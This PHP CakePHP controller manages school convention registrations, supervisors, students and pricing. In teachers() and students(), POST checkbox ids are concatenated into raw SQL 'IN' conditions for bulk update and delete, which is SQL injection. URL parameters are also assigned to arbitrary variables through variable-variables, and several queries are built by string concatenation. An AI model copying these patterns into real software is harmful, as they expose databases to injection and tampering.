<?php

namespace App\Controller;
use Cake\ORM\TableRegistry;
use Cake\Datasource\ConnectionManager;
use App\Controller\AppController;
use Cake\Core\Configure;
use Cake\Core\Configure\Engine\PhpConfig;
use Cake\Mailer\Email;
use Cake\I18n\I18n;

class ConventionregistrationsController extends AppController {

    public function initialize() {
        parent::initialize();

        // Include the FlashComponent
        $this->loadComponent('Flash');

        $this->loadModel("Users"); 
		$this->loadModel("Emailtemplates");
		$this->loadModel("Conventions");
		$this->loadModel("Conventionseasons");
		$this->loadModel("Events");
		$this->loadModel("Divisions");
		$this->loadModel("Seasons");
		$this->loadModel("Admins");
		$this->loadModel("Conventionregistrations");
		$this->loadModel("Conventionregistrationteachers");
		$this->loadModel("Conventionregistrationstudents");
		$this->loadModel("Settings");
		$this->loadModel("Transactions");
		$this->loadModel("Crstudentevents");
		$this->loadModel("Conventionseasonevents");
		$this->loadModel("Eventsubmissions");
		$this->loadModel("Results");
		$this->loadModel("Resultpositions");
		$this->loadModel("Books");
    }
	
	public function myregistrations() {

        $this->userLoginCheck();
        $this->multiLoginCheck(['School','Teacher_Parent','Judge']);
		
        $this->set("title_for_layout", "Convention Registrations" . TITLE_FOR_PAGES);
        $this->viewbuilder()->layout('home');
        
		$this->set('active_convention_registrations','active');
		
		$user_id = $this->request->session()->read("user_id");
		$userDetails = $this->Users->find()->where(['Users.id' => $user_id])->first();
        $this->set('userDetails', $userDetails);
		
		// first to get season_id for current year
		$season_id = $this->getCurrentSeason();
		$seasonD = $this->Seasons->find()->where(['Seasons.id' => $season_id])->first();
		$this->set('seasonD',$seasonD);
		
        $conditionCurrentSeason = array();
		$conditionCurrentSeason[] = "(Conventionregistrations.user_id = '".$user_id."')";
		$conditionCurrentSeason[] = "(Conventionregistrations.season_id = '".$season_id."')";
		$conditionCurrentSeason[] = "(Conventionregistrations.season_year = '".$seasonD->season_year."')";
		$conventionregistrations = $this->Conventionregistrations->find()->where($conditionCurrentSeason)->order(['Conventionregistrations.id' => 'DESC'])->contain(['Conventions'])->all();
		$this->set('conventionregistrations', $conventionregistrations);
		
		$myRegConvArr = array();
		foreach($conventionregistrations as $myconvreg)
		{
			$myRegConvArr[] = $myconvreg->convention_id;
		}
		
		// now get list of all available convention for this season - Like we did on homes/index
		$conventionIDS 		= array();
		$conventionIDS[] 	= 0;
		
		// We need to show conventions those are linked with current season
		$conventionSeasons = $this->Conventionseasons->find()->where(['Conventionseasons.season_id' => $season_id,'Conventionseasons.season_year' => $seasonD->season_year])->order(['Conventionseasons.id' => 'ASC'])->all();
		foreach($conventionSeasons as $convs)
		{
			if(!in_array($convs->convention_id,(array)$conventionIDS))
			{
				if(!in_array($convs->convention_id,(array)$myRegConvArr))
				{
					$conventionIDS[] 	= $convs->convention_id;
				}
			}
		}
		
		$conventionIDSImploded = implode(",",$conventionIDS);
		
		
		// to get conventions
		$condConvention = array();
		$condConvention[] = "(Conventions.id IN ($conventionIDSImploded))";
		$condConvention[] = "(Conventions.status  = '1')";
		$remainingconventions = $this->Conventions->find()->where($condConvention)->order(['Conventions.name' => 'ASC'])->all();
		$this->set('remainingconventions', $remainingconventions);
		
		// to get past registrations list
		$pastRegistrations = $this->Conventionregistrations->find()->where(["Conventionregistrations.user_id" => $user_id,"Conventionregistrations.season_year <" => $seasonD->season_year])->contain(["Conventions"])->order(['Conventionregistrations.id' => 'DESC'])->all();
		$this->set('pastRegistrations', $pastRegistrations);
		//$this->prx($pastRegistrations);
    }
	
	public function pastregistrationdetails($convRegSlug = null) {
		
		$user_id = $this->request->session()->read("user_id");
		$userDetails = $this->Users->find()->where(['Users.id' => $user_id])->first();
		
		$convRegD = $this->Conventionregistrations->find()->where(['Conventionregistrations.slug' => $convRegSlug,'Conventionregistrations.user_id' => $user_id])->first();
		//$this->prx($convRegD);
		
		if($convRegD->id>0)
		{
			$this->request->session()->write("sess_selected_convention_registration_id", $convRegD->id);
			$this->request->session()->write("sess_selected_convention_id", $convRegD->convention_id);
		}
		else
		{
			$this->Flash->error('Invalid information.');
		}
		
		$this->redirect(['controller' => 'users', 'action' => 'dashboard']);
	}
	
	public function teachers() {

        $this->userLoginCheck();
        $this->schoolAdminLoginCheck();
		
        $this->set("title_for_layout", "Supervisor Registration" . TITLE_FOR_PAGES);
        $this->viewbuilder()->layout('home');
        
		$this->set('active_cr_teachers','active');
		
        $msgString = '';

		$user_id = $this->request->session()->read("user_id");
		$userDetails = $this->Users->find()->where(['Users.id' => $user_id])->first();
        $this->set('userDetails', $userDetails);

        $separator = array();
        $condition = array();
		
		if($this->request->session()->read("sess_selected_convention_registration_id")>0)
		{
			$condition[] = "(Conventionregistrationteachers.conventionregistration_id = '".$this->request->session()->read("sess_selected_convention_registration_id")."')";
		}
		else
		{
			$this->Flash->error('Please choose convention registration first.');
			$this->redirect(['controller' => 'users', 'action' => 'dashboard']);
		}

        if ($this->request->is('post')) {
            if (isset($this->request->data['action'])) {
                $idList = implode(',', $this->request->data['chkRecordId']);
                $action = $this->request->data['action'];
                if ($idList) {
                    if ($action == "Activate") {
                        $this->Conventionregistrationteachers->updateAll(['status' => '1'], ["id IN ($idList)"]);
                        $this->Flash->success('Records are activated successfully.');
                    } elseif ($action == "Deactivate") {
                        $this->Conventionregistrationteachers->updateAll(['status' => '0'], ["id IN ($idList)"]);
                        $this->Flash->success('Records are deactivated successfully.');
                    } elseif ($action == "Delete") {
                        $this->Conventionregistrationteachers->deleteAll(["id IN ($idList)"]);
                        $this->Flash->success('Records are deleted successfully.');
                    }
                }
            }

            if (isset($this->request->data['Conventionregistrationteachers']['keyword']) && $this->request->data['Conventionregistrationteachers']['keyword'] != '') {
                $keyword = trim($this->request->data['Conventionregistrationteachers']['keyword']);
            }
        } elseif ($this->request->params) {
            if (isset($this->request->params['pass'][0]) && $this->request->params['pass'][0] != '') {
                $searchArr = $this->request->params['pass'];
                foreach ($searchArr as $val) {
                    if (strpos($val, ":") !== false) {
                        $vars = explode(":", $val);
                        ${$vars[0]} = urldecode($vars[1]);
                    }
                }
            }
        }

        if (isset($keyword) && $keyword != '') {
            $separator[] = 'keyword:' . urlencode($keyword);
            $condition[] = "(Conventionregistrationteachers.name LIKE '%".addslashes($keyword)."%')";
            $this->set('keyword', $keyword);
        }
        //pr($condition);exit;
        $separator = implode("/", $separator);
        $this->set('separator', $separator);
        $this->paginate = ['contain' => ['Conventions','Teachers'],'conditions' => $condition, 'limit' => 30, 'order' => ['Conventionregistrationteachers.season_year' => 'DESC']];
        $this->set('conventionregistrationteachers', $this->paginate($this->Conventionregistrationteachers));
        if ($this->request->is("ajax")) {
            $this->viewBuilder()->layout(($this->request->is("ajax")) ? "" : "default");
            $this->viewBuilder()->templatePath('Element' . DS . 'Conventionregistrations');
            $this->render('teachers');
        }
    }
	
	public function addteacher() {
		
		$this->userLoginCheck();
		$this->schoolAdminLoginCheck();
		
		// to check if registration is still open
		$this->checkRegistrationStillOpen($this->request->session()->read("sess_selected_convention_registration_id"));
		
		//echo ' fsdf sdf sdf d';exit;
		$this->viewbuilder()->layout("home");
        $this->set("title_for_layout", "Convention Registration - Add Supervisor " . TITLE_FOR_PAGES);
		
		$this->set('active_cr_teachers','active');
		
        $user_id = $this->request->session()->read("user_id");
		$userDetails = $this->Users->find()->where(['Users.id' => $user_id])->first();
        $this->set('userDetails', $userDetails);
		
		if($this->request->session()->read("sess_selected_convention_registration_id")>0)
		{
			$sess_selected_convention_registration_id = $this->request->session()->read("sess_selected_convention_registration_id");
			
			// to get convention registration details
			$conventionRegD = $this->Conventionregistrations->find()->where(['Conventionregistrations.id' => $sess_selected_convention_registration_id])->first();
			
			// to get list of all teachers selected for this convention registrations
			$selectedTCR = $this->Conventionregistrationteachers->find()->where(['Conventionregistrationteachers.conventionregistration_id' => $sess_selected_convention_registration_id])->all();
			$selectedTeachersCR = array();
			foreach($selectedTCR as $selt)
			{
				$selectedTeachersCR[] = $selt->teacher_id;
			}
			
			// to get list of all teachers for this school and exclude teachers who already added for this convention registration
			$condSchoolT = array();
			$condSchoolT[] = "(Users.school_id = '".$user_id."')";
			$condSchoolT[] = "(Users.user_type = 'Teacher_Parent')";
			$condSchoolT[] = "(Users.status != '2')";
			$teachersListSchool = $this->Users->find()->where($condSchoolT)->order(['Users.first_name' => 'ASC'])->all();
			
			$teacherSchoolDD = array();
			foreach($teachersListSchool as $tsl)
			{
				if(!in_array($tsl->id,(array)$selectedTeachersCR))
				{
					$teacherSchoolDD[$tsl->id] = $tsl->first_name.' '.$tsl->last_name;
				}
			}
			$this->set('teacherSchoolDD', $teacherSchoolDD);
		}
		else
		{
			$this->Flash->error('Please choose convention registration first.');
			$this->redirect(['controller' => 'users', 'action' => 'dashboard']);
		}
		
        if ($this->request->is('post')) {
			
			//$this->prx($this->request->data);
			
			$teacher_id = $this->request->data['Conventionregistrationteachers']['teacher_id'];
			
			$conventionregistrationteachers = $this->Conventionregistrationteachers->newEntity();
			$dataCRT = $this->Conventionregistrationteachers->patchEntity($conventionregistrationteachers, $this->request->data);

			$dataCRT->slug 								= "conv-reg-supervisor-".$sess_selected_convention_registration_id.'-'.$teacher_id.'-'.time();
			$dataCRT->conventionregistration_id			= $sess_selected_convention_registration_id;
			$dataCRT->convention_id						= $conventionRegD->convention_id;
			$dataCRT->user_id							= $conventionRegD->user_id;
			$dataCRT->season_id 						= $conventionRegD->season_id;
			$dataCRT->season_year 						= $conventionRegD->season_year;
			$dataCRT->teacher_id 						= $teacher_id;
			$dataCRT->status 							= 1;
			$dataCRT->created 							= date('Y-m-d H:i:s');

			$resultCRT = $this->Conventionregistrationteachers->save($dataCRT);
			
			$this->Flash->success('Supervisor added successfully to convention registration.');
			$this->redirect(['controller' => 'conventionregistrations', 'action' => 'teachers']);
        }
        $this->set('conventionregistrationteachers', $conventionregistrationteachers);
    }
	
	public function removeteacher($crt_slug = null) {
		
		$this->userLoginCheck();
		$this->schoolAdminLoginCheck();
		
        $user_id = $this->request->session()->read("user_id");
		$userDetails = $this->Users->find()->where(['Users.id' => $user_id])->first();
        $this->set('userDetails', $userDetails);
		
		if($this->request->session()->read("sess_selected_convention_registration_id")>0)
		{
			$sess_selected_convention_registration_id = $this->request->session()->read("sess_selected_convention_registration_id");
			
			// to check if slug exists
			$checkCRT = $this->Conventionregistrationteachers->find()->where(['Conventionregistrationteachers.slug' => $crt_slug,'Conventionregistrationteachers.conventionregistration_id' => $sess_selected_convention_registration_id])->first();
			if($checkCRT)
			{
				// now check that if any student assigned to this teacher (renamed to supervisor) or not
				$checkStudentAssigned = $this->Conventionregistrationstudents->find()->where(['Conventionregistrationstudents.teacher_parent_id' => $checkCRT->teacher_id,'Conventionregistrationstudents.conventionregistration_id' => $sess_selected_convention_registration_id])->first();
				
				if($checkStudentAssigned)
				{
					$this->Flash->error('You cannot delete this supervisor. Student is assigned to this supervisor.');
				}
				else
				{
					$this->Flash->success('Supervisor successfully removed from convention registration.');
					$this->Conventionregistrationteachers->deleteAll(["slug" => $crt_slug]);
				}
			}
			else
			{
				$this->Flash->error('Invalid supervisor details.');
			}
		}
		else
		{
			$this->Flash->error('Please choose convention registration first.');
			$this->redirect(['controller' => 'users', 'action' => 'dashboard']);
		}
		
		$this->redirect(['controller' => 'conventionregistrations', 'action' => 'teachers']);
    }
	
	public function students() {

        $this->userLoginCheck();
        $this->schoolAdminLoginCheck();
		
        $this->set("title_for_layout", "Student Registration" . TITLE_FOR_PAGES);
        $this->viewbuilder()->layout('home');
        
		$this->set('active_cr_students','active');
		
        $msgString = '';

		$user_id = $this->request->session()->read("user_id");
		$userDetails = $this->Users->find()->where(['Users.id' => $user_id])->first();
        $this->set('userDetails', $userDetails);
		
		// to get the list of teachers/parents (rename to Supervisors) chosen for this convention registration
		$teacherDDCR = array();
		$teacherDDCR[] = 0;
		$teacherLConvReg = $this->Conventionregistrationteachers->find()->where(['Conventionregistrationteachers.conventionregistration_id' => $this->request->session()->read("sess_selected_convention_registration_id")])->order(['Conventionregistrationteachers.id' => 'DESC'])->all();
		foreach($teacherLConvReg as $teachercr)
		{
			$teacherDDCR[] = $teachercr->teacher_id;
		}
		$teacherDDCRImplode = implode(",",$teacherDDCR);
		
		// now create a dropdown for this teachers list
		$teacherDropDownData = array();
		$condTLDD = array();
		$condTLDD[] = "(Users.id IN ($teacherDDCRImplode) )";
		$teacherUL = $this->Users->find()->where($condTLDD)->order(['Users.first_name' => 'ASC','Users.last_name' => 'ASC'])->all();
		foreach($teacherUL as $teacherl4dd)
		{
			$teacherDropDownData[$teacherl4dd->id] = $teacherl4dd->first_name.' '.$teacherl4dd->last_name;
		}
		$this->set('teacherDropDownData', $teacherDropDownData);
		
		//$this->prx($teacherDropDownData);
		
		// to check if price structure chosen for this convention registration or not
		$checkPriceStructure = $this->Conventionregistrations->find()->where(['Conventionregistrations.id' => $this->request->session()->read("sess_selected_convention_registration_id")])->first();
		$this->set('checkPriceStructure', $checkPriceStructure);
		
		// to get list of events in which certificate print is allowed
		$arrEventCP = array();
		$eventCP = $this->Events->find()->where(['Events.certificate_print' => 1])->all();
		foreach($eventCP as $evcp)
		{
			$arrEventCP[] = $evcp->id;
		}
		$this->set('arrEventCP', $arrEventCP);
		

        $separator = array();
        $condition = array();
		
		if($this->request->session()->read("sess_selected_convention_registration_id")>0)
		{
			$condition[] = "(Conventionregistrationstudents.conventionregistration_id = '".$this->request->session()->read("sess_selected_convention_registration_id")."')";
		}
		else
		{
			$this->Flash->error('Please choose convention registration first.');
			$this->redirect(['controller' => 'users', 'action' => 'dashboard']);
		}

        if ($this->request->is('post')) {
            if (isset($this->request->data['action'])) {
                $idList = implode(',', $this->request->data['chkRecordId']);
                $action = $this->request->data['action'];
                if ($idList) {
                    if ($action == "Activate") {
                        $this->Conventionregistrationstudents->updateAll(['status' => '1'], ["id IN ($idList)"]);
                        $this->Flash->success('Records are activated successfully.');
                    } elseif ($action == "Deactivate") {
                        $this->Conventionregistrationstudents->updateAll(['status' => '0'], ["id IN ($idList)"]);
                        $this->Flash->success('Records are deactivated successfully.');
                    } elseif ($action == "Delete") {
                        $this->Conventionregistrationstudents->deleteAll(["id IN ($idList)"]);
                        $this->Flash->success('Records are deleted successfully.');
                    }
                }
            }

            if (isset($this->request->data['Conventionregistrationstudents']['keyword']) && $this->request->data['Conventionregistrationstudents']['keyword'] != '') {
                $keyword = trim($this->request->data['Conventionregistrationstudents']['keyword']);
            }
        } elseif ($this->request->params) {
            if (isset($this->request->params['pass'][0]) && $this->request->params['pass'][0] != '') {
                $searchArr = $this->request->params['pass'];
                foreach ($searchArr as $val) {
                    if (strpos($val, ":") !== false) {
                        $vars = explode(":", $val);
                        ${$vars[0]} = urldecode($vars[1]);
                    }
                }
            }
        }

        if (isset($keyword) && $keyword != '') {
            $separator[] = 'keyword:' . urlencode($keyword);
            $condition[] = "(Conventionregistrationstudents.name LIKE '%".addslashes($keyword)."%')";
            $this->set('keyword', $keyword);
        }
        //pr($condition);exit;
        $separator = implode("/", $separator);
        $this->set('separator', $separator);
        $this->paginate = ['contain' => ['Conventions','Students'],'conditions' => $condition, 'limit' => 50, 'order' => ['Conventionregistrationstudents.season_year' => 'DESC']];
        $this->set('conventionregistrationstudents', $this->paginate($this->Conventionregistrationstudents));
        if ($this->request->is("ajax")) {
            $this->viewBuilder()->layout(($this->request->is("ajax")) ? "" : "default");
            $this->viewBuilder()->templatePath('Element' . DS . 'Conventionregistrations');
            $this->render('students');
        }
    }
	
	public function addstudent() {

		$this->userLoginCheck();
		$this->schoolAdminLoginCheck();
		
		// to check if registration is still open
		$this->checkRegistrationStillOpen($this->request->session()->read("sess_selected_convention_registration_id"));
		
		//echo ' fsdf sdf sdf d';exit;
		$this->viewbuilder()->layout("home");
        $this->set("title_for_layout", "Convention Registration - Add Student " . TITLE_FOR_PAGES);
		
		$this->set('active_cr_students','active');
		
        $user_id = $this->request->session()->read("user_id");
		$userDetails = $this->Users->find()->where(['Users.id' => $user_id])->first();
        $this->set('userDetails', $userDetails);
		
		if($this->request->session()->read("sess_selected_convention_registration_id")>0)
		{
			$sess_selected_convention_registration_id = $this->request->session()->read("sess_selected_convention_registration_id");
			
			// to get convention registration details
			$conventionRegD = $this->Conventionregistrations->find()->where(['Conventionregistrations.id' => $sess_selected_convention_registration_id])->first();
			
			// to get list of all students selected for this convention registrations
			$selectedSCR = $this->Conventionregistrationstudents->find()->where(['Conventionregistrationstudents.conventionregistration_id' => $sess_selected_convention_registration_id])->all();
			$selectedStudentsCR = array();
			foreach($selectedSCR as $sels)
			{
				$selectedStudentsCR[] = $sels->student_id;
			}
			
			// to get list of all students for this school
			$condSchoolS = array();
			$condSchoolS[] = "(Users.school_id = '".$user_id."')";
			$condSchoolS[] = "(Users.user_type = 'Student')";
			$condSchoolS[] = "(Users.status != '2')";
			$studentsListSchool = $this->Users->find()->where($condSchoolS)->order(['Users.first_name' => 'ASC'])->all();
			
			$studentSchoolDD = array();
			foreach($studentsListSchool as $ssl)
			{
				if(!in_array($ssl->id,(array)$selectedStudentsCR))
				{
					$studentSchoolDD[$ssl->id] = $ssl->first_name.' '.$ssl->middle_name.' '.$ssl->last_name;
				}
			}
			$this->set('studentSchoolDD', $studentSchoolDD);
			
			
			// to get the list of teachers/parents (rename to Supervisors) chosen for this convention registration
			$teacherDDCR = array();
			$teacherDDCR[] = 0;
			$teacherLConvReg = $this->Conventionregistrationteachers->find()->where(['Conventionregistrationteachers.conventionregistration_id' => $this->request->session()->read("sess_selected_convention_registration_id")])->order(['Conventionregistrationteachers.id' => 'DESC'])->all();
			foreach($teacherLConvReg as $teachercr)
			{
				$teacherDDCR[] = $teachercr->teacher_id;
			}
			$teacherDDCRImplode = implode(",",$teacherDDCR);
			
			// now create a dropdown for this teachers list
			$teacherDropDownData = array();
			$condTLDD = array();
			$condTLDD[] = "(Users.id IN ($teacherDDCRImplode) )";
			$teacherUL = $this->Users->find()->where($condTLDD)->order(['Users.first_name' => 'ASC','Users.last_name' => 'ASC'])->all();
			foreach($teacherUL as $teacherl4dd)
			{
				$teacherDropDownData[$teacherl4dd->id] = $teacherl4dd->first_name.' '.$teacherl4dd->last_name;
			}
			$this->set('teacherDropDownData', $teacherDropDownData);
			
		}
		else
		{
			$this->Flash->error('Please choose convention registration first.');
			$this->redirect(['controller' => 'users', 'action' => 'dashboard']);
		}
		
        $conventionregistrationstudents = $this->Conventionregistrationstudents->newEntity();
		if ($this->request->is('post')) {
			
			$data = $this->Conventionregistrationstudents->patchEntity($conventionregistrationstudents, $this->request->data);
			
			$flagCheckAge = 1;
			
			// to check the age of student
			$studentD = $this->Users->find()->where(['Users.id' => $data->student_id])->select(['birth_year'])->first();
			//$this->prx($studentD);
			$studentAge = $conventionRegD->season_year-$studentD->birth_year;
			if($studentAge<11 || $studentAge>=21)
			{
				$flagCheckAge = 0;
				$this->Flash->error('Students must be between between 11 years - 20 years in convention year.');
			}
			
            if (count($data->errors()) == 0 && $flagCheckAge == 1) {

				$data->slug 						= 'conv-reg-student-'.$sess_selected_convention_registration_id.'-'.$data->student_id.'-'.time();
				$data->conventionregistration_id	= $sess_selected_convention_registration_id;
				$data->convention_id				= $conventionRegD->convention_id;
				$data->user_id						= $conventionRegD->user_id;
				$data->season_id 					= $conventionRegD->season_id;
				$data->season_year 					= $conventionRegD->season_year;
				$data->status 						= 1;
				$data->created 						= date('Y-m-d H:i:s');
				
                if ($this->Conventionregistrationstudents->save($data)) {
                    $this->Flash->success('Student added successfully to convention registration.');
					$this->redirect(['controller' => 'conventionregistrations', 'action' => 'students']);
                }
            } 
			else
			{
                // $this->Flash->error('Please below listed errors.');
            }
			
        }
        $this->set('conventionregistrationstudents', $conventionregistrationstudents);
    }
	
	public function removestudent($crs_slug = null) {
		
		$this->userLoginCheck();
		$this->schoolAdminLoginCheck();
		
        $user_id = $this->request->session()->read("user_id");
		$userDetails = $this->Users->find()->where(['Users.id' => $user_id])->first();
        $this->set('userDetails', $userDetails);
		
		if($this->request->session()->read("sess_selected_convention_registration_id")>0)
		{
			$sess_selected_convention_registration_id = $this->request->session()->read("sess_selected_convention_registration_id");
			
			// to check if slug exists
			$checkCRS = $this->Conventionregistrationstudents->find()->where(['Conventionregistrationstudents.slug' => $crs_slug,'Conventionregistrationstudents.conventionregistration_id' => $sess_selected_convention_registration_id])->first();
			if($checkCRS)
			{
				// Step 1 :: Remove event submissions
				$studentEvSub = $this->Eventsubmissions->find()->where(['Eventsubmissions.conventionregistration_id' => $checkCRS->conventionregistration_id,
				'Eventsubmissions.student_id' => $checkCRS->student_id])->all();
				
				foreach($studentEvSub as $stevsubrec)
				{
					if(!empty($stevsubrec->mediafile_file_system_name) && file_exists(UPLOAD_EVENTS_SUBMISSION_DOCUMENT_PATH.$stevsubrec->mediafile_file_system_name))
					{
						@unlink(UPLOAD_EVENTS_SUBMISSION_DOCUMENT_PATH.$stevsubrec->mediafile_file_system_name);
					}
					
					if(!empty($stevsubrec->report) && file_exists(UPLOAD_EVENTS_SUBMISSION_DOCUMENT_PATH.$stevsubrec->report))
					{
						@unlink(UPLOAD_EVENTS_SUBMISSION_DOCUMENT_PATH.$stevsubrec->report);
					}
					
					if(!empty($stevsubrec->score_sheet) && file_exists(UPLOAD_EVENTS_SUBMISSION_DOCUMENT_PATH.$stevsubrec->score_sheet))
					{
						@unlink(UPLOAD_EVENTS_SUBMISSION_DOCUMENT_PATH.$stevsubrec->score_sheet);
					}
					
					if(!empty($stevsubrec->additional_documents) && file_exists(UPLOAD_EVENTS_SUBMISSION_DOCUMENT_PATH.$stevsubrec->additional_documents))
					{
						@unlink(UPLOAD_EVENTS_SUBMISSION_DOCUMENT_PATH.$stevsubrec->additional_documents);
					}
					
					// Remove submission
					$this->Eventsubmissions->deleteAll(["id"=>$stevsubrec->id]);
				}
				
				
				// Step 2 :: Remove any grouping
				$this->Crstudentevents->deleteAll(["conventionregistration_id"=>$checkCRS->conventionregistration_id,"student_id"=>$checkCRS->student_id]);
				
				// Step 3 :: Now remove student
				$this->Conventionregistrationstudents->deleteAll(["slug" => $crs_slug]);
				
				$this->Flash->success('Student successfully removed from convention registration.');
			}
			else
			{
				$this->Flash->error('Invalid student details.');
			}
		}
		else
		{
			$this->Flash->error('Please choose convention registration first.');
			$this->redirect(['controller' => 'users', 'action' => 'dashboard']);
		}
		
		$this->redirect(['controller' => 'conventionregistrations', 'action' => 'students']);
    }
	
	public function registerfornewconvention($convention_slug=null,$season_id=null)
	{
		$this->userLoginCheck();
		$this->schoolAdminLoginCheck();
		
		$user_id = $this->request->session()->read("user_id");
		$userDetails = $this->Users->find()->where(['Users.id' => $user_id])->first();
		
		// check convention details
		$conventionD = $this->Conventions->find()->where(['Conventions.slug' => $convention_slug])->first();
		if($conventionD)
		{
			// to get season details
			$seasonD = $this->Seasons->find()->where(['Seasons.id' => $season_id])->first();
			if($seasonD)
			{
				// enter this user record in conventionregistrations table
				$convention_id 	= $conventionD->id;
				
				// to get the convention season details
				$convSeasonD = $this->Conventionseasons->find()->where(['Conventionseasons.convention_id' => $convention_id,'Conventionseasons.season_id' => $season_id,'Conventionseasons.season_year' => $seasonD->season_year])->first();
				
				//$this->prx($convSeasonD);
				
				// to check that registration started or not
				$currDateTime = time();
				$regStartDateTime = strtotime($convSeasonD->registration_start_date);
				$regEndDateTime = strtotime($convSeasonD->registration_end_date);
				
				if($currDateTime>=$regStartDateTime && $currDateTime<=$regEndDateTime)
				{
					// registration accepted
					$regAccepted = 1;
				}
				else
				{
					$regAccepted = 0;
					$this->Flash->error('Registrations are not accepted.');
				}
				
				if($regAccepted == 1)
				{
					// to check if this record already exists
					$checkRegExists = $this->Conventionregistrations->find()->where(['Conventionregistrations.convention_id' => $convention_id,'Conventionregistrations.user_id' => $user_id,'Conventionregistrations.season_id' => $season_id])->first();
					if($checkRegExists)
					{
						$convRegID 		= $checkRegExists->id;
						$convRegSlug 	= $checkRegExists->slug;
						$this->Conventionregistrations->updateAll(['modified' => date('Y-m-d H:i:s')], ["id" => $convRegID]);
						
						$this->Flash->error('You have already registered for this convention.');
					}
					else
					{
						// insert new record
						$conventionregistrations = $this->Conventionregistrations->newEntity();
						$dataCR = $this->Conventionregistrations->patchEntity($conventionregistrations, array());

						$dataCR->conventionseason_id 	= $convSeasonD->id;
						$dataCR->slug 					= "convention-registration-".$convention_id.'-'.$user_id.'-'.$season_id.'-'.time();
						$dataCR->convention_id			= $convention_id;
						$dataCR->user_id				= $user_id;
						$dataCR->season_id				= $season_id;
						$dataCR->season_year 			= $seasonD->season_year;
						$dataCR->status 				= 1;
						
						$dataCR->created 				= date('Y-m-d H:i:s');
						$dataCR->modified 				= NULL;

						$resultCR 		= $this->Conventionregistrations->save($dataCR);
						$convRegID 		= $resultCR->id;
						$convRegSlug 	= $resultCR->slug;
						
						$this->Flash->success('You have successfully registered for convention.');
					}
				}
					
				
			}
		}
		else
		{
			$this->Flash->error('Invalid information.');
		}
		
		$this->redirect(['controller' => 'users', 'action' => 'dashboard']);
	}
	
	public function pricestructure() {
		
		$this->userLoginCheck();
		$this->schoolAdminLoginCheck();
		
		//echo ' fsdf sdf sdf d';exit;
		$this->viewbuilder()->layout("home");
        $this->set("title_for_layout", "Price Structure " . TITLE_FOR_PAGES);
		
		$this->set('active_cr_price_structure','active');
		
        $user_id = $this->request->session()->read("user_id");
		$userDetails = $this->Users->find()->where(['Users.id' => $user_id])->first();
        $this->set('userDetails', $userDetails);
		
		if($this->request->session()->read("sess_selected_convention_registration_id")>0)
		{
			$sess_selected_convention_registration_id = $this->request->session()->read("sess_selected_convention_registration_id");
			
			// to get convention registration details
			$conventionRegD = $this->Conventionregistrations->find()->where(['Conventionregistrations.id' => $sess_selected_convention_registration_id])->first();
			$this->set('conventionRegD', $conventionRegD);
			
			/* Sudhir New prices - 12-Feb-2024 */
			$convSeasonD = $this->Conventionseasons->find()->where(['Conventionseasons.id' => $conventionRegD->conventionseason_id])->first();
			if($convSeasonD)
			{
				//$this->prx($convSeasonD);
				$student_registration_fees 				= $convSeasonD->student_registration_fees;
				$non_competitor_registration_fees 		= $convSeasonD->non_competitor_registration_fees;
				$non_affiliate_registration_fees 		= $convSeasonD->non_affiliate_registration_fees;
			}
			else
			{
				
			}
			
			// to get prices from settings table
			//$settingsD = $this->Settings->find()->where(['Settings.id' => 1])->first();
			//$full_registration_price 			= $settingsD->full_registration_price;
			//$scripture_only_registration_price 	= $settingsD->scripture_only_registration_price;
			
			// to get pricing structure as dropdown
			/* $priceStructureDD = array();
			$priceStructureDD['full_registration'] 				= "Full Registration ($".number_format($full_registration_price,2)." ".CURR." per student)";
			$priceStructureDD['scripture_only_registration'] 	= "Scripture only registration ($".number_format($scripture_only_registration_price,2)." ".CURR." per student)"; */
			
			
			$priceStructureDD = array();
			$priceStructureDD['student_registration_fees'] 				= "Student registration ($".number_format($student_registration_fees,2)." ".CURR." per student)";
			$priceStructureDD['non_competitor_registration_fees'] 				= "Non-competitor registration ($".number_format($non_competitor_registration_fees,2)." ".CURR." per student)";
			$priceStructureDD['non_affiliate_registration_fees'] 				= "Non-affiliate registration ($".number_format($non_affiliate_registration_fees,2)." ".CURR." per student)";
			
			$this->set('priceStructureDD', $priceStructureDD);
			
			// to check if payment done for this convention registration
			$checkPaymentConvReg = $this->Transactions->find()->where(['Transactions.conventionregistration_id' => $sess_selected_convention_registration_id])->first();
			if($checkPaymentConvReg)
			{
				$this->set('checkPaymentConvReg', $checkPaymentConvReg);
				$this->set('paymentDone', 'Yes');
			}
			else
			{
				$this->set('paymentDone', 'No');
			}
		}
		else
		{
			$this->Flash->error('Please choose convention registration first.');
			$this->redirect(['controller' => 'users', 'action' => 'dashboard']);
		}
		
        if ($this->request->is('post')) {
			
			//$this->prx($this->request->data);
			
			$price_structure = $this->request->data['Conventionregistrations']['price_structure'];
			
			if($price_structure == "student_registration_fees")
			{
				$price_per_student = $student_registration_fees;
			}
			else
			if($price_structure == "non_competitor_registration_fees")
			{
				$price_per_student = $non_competitor_registration_fees;
			}
			else
			if($price_structure == "non_affiliate_registration_fees")
			{
				$price_per_student = $non_affiliate_registration_fees;
			}
			
			$this->Conventionregistrations->updateAll(['price_structure' => $price_structure,'price_per_student' => $price_per_student], ["id" => $sess_selected_convention_registration_id]);
			
			
			
			$this->Flash->success('Price structure updated successfully for this convention registration.');
			$this->redirect(['controller' => 'conventionregistrations', 'action' => 'pricestructure']);
        }
		
    }
	
	public function studentevents() {

        $this->userLoginCheck();
        $this->multiLoginCheck(array("School","Teacher_Parent"));
		
        $this->set("title_for_layout", "Student Event Registration" . TITLE_FOR_PAGES);
        $this->viewbuilder()->layout('home');
        
		$this->set('active_cr_studentevents','active');
		
        $msgString = '';

		$user_id 	= $this->request->session()->read("user_id");
		$user_type 	= $this->request->session()->read("user_type");
		$userDetails = $this->Users->find()->where(['Users.id' => $user_id])->first();
        $this->set('userDetails', $userDetails);

        $separator = array();
        $condition = array();
		
		/* $condition[] = "(Conventionregistrationstudents.event_ids != '' AND Conventionregistrationstudents.event_ids IS NOT NULL)"; */
		
		if($this->request->session()->read("sess_selected_convention_registration_id")>0)
		{
			$condition[] = "(Conventionregistrationstudents.conventionregistration_id = '".$this->request->session()->read("sess_selected_convention_registration_id")."')";
		}
		else
		{
			$this->Flash->error('Please choose convention registration first.');
			$this->redirect(['controller' => 'users', 'action' => 'dashboard']);
		}
		
		// to check if teacher is logged in then teacher can only see students assigned to him
		if($user_type == "Teacher_Parent")
		{
			$condition[] = "(Conventionregistrationstudents.teacher_parent_id = '".$user_id."')";
		}
		
		$studentList = $this->Conventionregistrationstudents->find()->where($condition)->order(["Conventionregistrationstudents.id" => "DESC"])->contain(['Conventions','Students'])->all();
		$this->set('studentList',$studentList);
    }
	
